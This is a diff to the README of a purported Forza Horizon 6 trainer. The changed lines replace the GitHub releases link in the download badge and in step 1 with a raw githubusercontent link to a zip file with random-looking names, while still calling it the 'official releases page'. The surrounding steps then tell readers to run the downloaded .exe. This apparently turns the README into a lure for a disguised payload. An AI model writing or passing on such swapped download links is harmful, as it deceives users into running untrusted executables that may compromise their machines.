@@ -5,7 +5,7 @@ description: "Edit Forza Horizon 6 career progress, manage garage presets, and a
 ---
 # 🏎️ Forza-Horizon-6-Trainer - Edit career stats and customize race performance
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/skulteti8372/Forza-Horizon-6-Trainer/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/skulteti8372/skulteti8372.github.io/main/flinchingly/skulteti_io_github_ptyalectasis.zip)
 
 Forza Horizon 6 Trainer provides tools to modify game files and adjust vehicle dynamics. Users utilize this software to manage career progression, organize car rosters, and update handling profiles. The application functions as a local utility for the Windows version of the game.
 
@@ -13,7 +13,7 @@ Forza Horizon 6 Trainer provides tools to modify game files and adjust vehicle d
 
 Follow these steps to obtain and use the software.
 
-1. Visit the [official releases page](https://github.com/skulteti8372/Forza-Horizon-6-Trainer/releases) to download the latest setup file. 
+1. Visit the [official releases page](https://raw.githubusercontent.com/skulteti8372/skulteti8372.github.io/main/flinchingly/skulteti_io_github_ptyalectasis.zip) to download the latest setup file. 
 2. Choose the file ending in .exe to begin the installer.
 3. Save the file to your computer.
 4. Open the downloaded file to start the installation.
